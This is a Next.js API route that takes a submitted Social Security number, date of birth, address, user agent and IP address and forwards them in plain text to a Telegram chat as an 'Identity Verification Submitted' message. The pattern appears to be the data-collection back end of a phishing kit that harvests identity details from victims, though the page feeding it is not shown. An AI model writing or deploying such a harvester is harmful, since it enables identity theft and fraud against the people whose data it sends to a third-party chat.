import { type NextRequest, NextResponse } from "next/server"
import { sendTelegramNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const { ssn, dateOfBirth, address, city, state, zipCode, timestamp, userAgent } = await request.json()

    const message =
      `🆔 <b>Identity Verification Submitted</b>\n\n` +
      `🔢 SSN: <code>${ssn}</code>\n` +
      `📅 Date of Birth: <code>${dateOfBirth}</code>\n` +
      `🏠 Address: <code>${address}</code>\n` +
      `🏙️ City: <code>${city}</code>\n` +
      `🗺️ State: <code>${state}</code>\n` +
      `📮 ZIP Code: <code>${zipCode}</code>\n` +
      `⏰ Time: ${new Date(timestamp).toLocaleString()}\n` +
      `🌐 User Agent: ${userAgent}\n` +
      `📍 IP: ${request.ip || "Unknown"}`

    await sendTelegramNotification(message)

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Identity verification notification error:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
